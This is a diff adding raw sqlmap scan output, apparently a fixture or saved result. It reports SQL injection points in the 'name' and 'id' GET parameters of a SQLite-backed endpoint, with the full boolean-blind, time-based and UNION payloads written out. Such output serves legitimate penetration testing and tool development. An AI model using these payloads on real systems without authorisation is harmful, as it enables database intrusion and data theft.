@@ -1,0 +1,25 @@
+sqlmap identified the following injection point(s) with a total of 164 HTTP(s) requests:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: SQLite OR boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: id=1&name=-7710' OR CASE WHEN 1218=1218 THEN 1218 ELSE JSON(CHAR(115,110,116,103)) END-- BEou
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: id=1&name=widget' OR 1072=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- EBuJ
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 7904=7904-- czBM&name=widget
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 1303=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- whxj&name=widget
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT CHAR(113,120,120,122,113)||CHAR(117,90,109,78,83,65,68,80,82,74,68,81,118,103,105,104,114,68,117,88,100,67,104,118,112,100,68,76,79,89,70,89,110,107,107,121,76,122,116,104)||CHAR(113,112,98,106,113),NULL-- PXRs&name=widget
+---
+back-end DBMS: SQLite
